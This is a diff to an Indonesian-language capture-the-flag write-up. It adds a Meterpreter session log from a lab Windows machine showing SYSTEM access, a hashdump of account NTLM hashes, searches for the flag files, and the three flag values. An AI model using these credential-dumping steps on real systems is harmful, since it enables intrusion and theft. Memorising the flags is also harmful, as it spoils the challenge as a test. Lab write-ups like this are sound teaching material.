@@ -41,9 +41,48 @@ Langkah-langkah:
 
 Lokasi Flag yang Ditemukan:
 
-    Flag 1: Terletak di direktori utama sistem (C:\).
-    Flag 2: Ditemukan di dalam direktori konfigurasi sistem Windows.
-    Flag 3: Ditemukan di dalam folder dokumen salah satu profil pengguna.
+```
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+meterpreter > search -f flag1.txt
+
+Found 1 result...
+=================
+
+Path          Size (bytes)  Modified (UTC)
+----          ------------  --------------
+c:\flag1.txt  24            2019-03-18 03:27:21 +0800
+
+meterpreter > 
+meterpreter > cat "c:\\flag1.txt"
+flag{access_the_machine}meterpreter > search -f flag2.txt
+Found 1 result...
+=================
+
+Path                                  Size (bytes)  Modified (UTC)
+----                                  ------------  --------------
+c:\Windows\System32\config\flag2.txt  34            2019-03-18 03:32:48 +0800
+
+meterpreter > cat "c:\\Windows\\System32\\config\\flag2.txt"
+flag{sam_database_elevated_access}meterpreter > search -f flag3.txt
+Found 1 result...
+=================
+
+Path                              Size (bytes)  Modified (UTC)
+----                              ------------  --------------
+c:\Users\Jon\Documents\flag3.txt  37            2019-03-18 03:26:36 +0800
+
+meterpreter > cat "c:\\Users\\Jon\\Documents\\flag3.txt"
+flag{admin_documents_can_be_valuable}meterpreter > Interrupt: use the 'exit' command to quit
+```
+    Flag 1: flag{access_the_machine}
+    Flag 2: flag{sam_database_elevated_access}
+    Flag 3: flag{admin_documents_can_be_valuable}
+```
 
 <img width="768" height="453" alt="image" src="https://github.com/user-attachments/assets/1ae1fdf2-f255-46ac-8893-4736cde1ea09" />
 <img width="767" height="633" alt="image" src="https://github.com/user-attachments/assets/145e5135-0929-4b8b-ad29-a065384d3ed6" />
